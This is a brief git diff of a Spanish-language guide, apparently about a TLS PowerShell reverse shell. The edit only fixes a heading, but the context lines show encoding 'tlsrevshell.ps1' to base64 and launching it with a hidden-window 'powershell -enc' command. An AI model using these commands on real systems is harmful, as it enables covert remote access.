@@ -40,7 +40,7 @@ set-alias new-exercise $($shurmano | foreach { if ($_ -cmatch '[A-Z]' 
 cat tlsrevshell.ps1 | iconv -f UTF8 -t UTF16LE | base64 -w 0
 ```
 
-**4.- Ejecutarlo desde consola PS **
+**4.- Ejecutarlo desde consola PS**
 
 ```
 powershell -noP -sta -w 1 -enc ENC64SCRIPT
